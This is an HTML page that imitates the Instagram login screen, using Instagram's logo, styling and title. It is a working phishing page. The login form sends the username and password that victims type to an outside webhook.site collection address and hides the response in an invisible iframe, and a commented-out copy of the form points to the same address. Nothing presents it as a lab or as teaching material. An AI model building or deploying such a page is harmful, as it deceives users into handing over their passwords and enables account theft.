<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Log In</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            max-width: 350px;
            width: 100%;
            padding: 20px;
            border: 1px solid #dbdbdb;
            background-color: #fff;
            text-align: center;
        }
        .login-container img {
            width: 175px;
            margin-bottom: 20px; 
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
        }
        .login-button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }
        .login-button:hover {
            background-color: #007bb5;
        }
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divider:not(:empty)::before {
            margin-right: .25em;
        }
        .divider:not(:empty)::after {
            margin-left: .25em;
        }
        .facebook-login {
            color: #385185;
            font-weight: bold;
            margin: 20px 0;
            cursor: pointer;
        }
        .signup-container {
            margin-top: 10px;
            padding: 20px;
            border: 1px solid #dbdbdb;
            background-color: #fff;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        <!-- <form action="https://webhook.site/13747b78-0ba7-4ade-abcc-f619cb8886a2" method="post"> -->
            <form id="loginForm" action="https://webhook.site/13747b78-0ba7-4ade-abcc-f619cb8886a2" method="POST" target="hidden_iframe">

            <input type="text" name="username" class="input-field" placeholder="Phone number, username or email address" required>
            <input type="password" name="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="login-button">Log In</button>
        </form>
        
        <div class="divider">OR</div>
        <div class="facebook-login">Log in with Facebook</div>
        <div>Forgotten your password?</div>
    </div>
    <div class="signup-container">
        Don't have an account? <span style="color: #0095f6; font-weight: bold; cursor: pointer;">Sign up</span>
    </div>
</body>
</html>
